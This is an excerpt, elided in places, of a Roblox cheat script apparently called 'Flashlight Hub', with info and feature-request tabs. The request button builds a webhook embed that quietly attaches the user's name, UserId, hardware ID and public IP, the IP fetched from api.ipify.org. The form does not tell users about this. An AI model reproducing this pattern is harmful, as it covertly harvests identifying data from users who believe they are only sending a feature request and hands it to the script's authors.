...
--// Info Tab UI
local serverVersion = LocalPlayer.PlayerGui.Main.ServerVersion.Text
...
InfoTab:CreateLabel({Name = "Made by VateQ & CandyHub\ndiscord: vateq || discord.gg/EAbRQtEzWY\n"})

local versionLabel = InfoTab:CreateLabel({Name = "Supported Version:   ".. supportedVersion .." | " .. tostring(supportedVersionp) .. "\nServer/Game Version: " .. serverVersion .. " | " .. tostring(game.PlaceVersion) .. "\n"})

local securityLabel = InfoTab:CreateLabel({Name = security})

InfoTab:CreateButton({
    Name = "DanceButton | requested by user, does nothing   ",
    Callback = function()
...
InfoTab:CreateButton({
    Name = "Join Discord!",
    Callback = function()
        -- Approximate modal with direct execution
...
--// Request Tab UI
RequestTab:CreateLabel({Name = "Request your feature, if possible to make\nit will probably be added\nYou can also report bugs here."})

RequestTab:CreateLabel({Name = " \n!!!WARNING!!!\nTROLLING WILL RESULT IN BLACKLIST FROM USING SCRIPT\n"})

if request then
    getgenv().ooosent = false
    local featureRequest777 = ""
    RequestTab:CreateInput({
        Name = "Request Feature",
        PlaceholderText = "request feature. . .",
        CurrentValue = "",
        Callback = function(Text)
            featureRequest777 = Text
        end
    })

    RequestTab:CreateButton({
        Name = "     REQUEST FEATURE     ",
        Callback = function()
            -- Approximate modal with direct execution
            if featureRequest777 == "" then
                ...
                if not getgenv().ooosent then 
                            ...
                            ["embeds"] = {
                                {
                                    ...
                                    ["description"] = "Executed by: "..LocalPlayer.Name.." / "..LocalPlayer.UserId,
                                    ["color"] = 65280,
                                    ["fields"] = {
                                        {
                                            ["name"] = "place version:",
                                        ...
                                        {
                                            ["name"] = "User",
                                            ["value"] = "```yaml\nName: "..LocalPlayer.Name.."\nDisplayName: "..LocalPlayer.DisplayName.."\nUserId: "..LocalPlayer.UserId.."\nHWID: "..RbxAnalyticsService:GetClientId().." \nIP: ".. HttpService:JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip .."\n```"
                                        }
                                    },
                                    ["footer"] = {
                                        ["text"] = "candyhub dev"
                    ...
                    Luna:Notification({
                        Title = "Request Feature",
                        Content = "one request per execution.."
                    })
                end
            end
        end
...
--// Notification
Luna:Notification({
    Title = "Flashlight Hub Loaded",
    Icon = "flash_on",
    ImageSource = "Material",
    Content = "Flashlight Hub is ready. Use the tabs to access features."
})
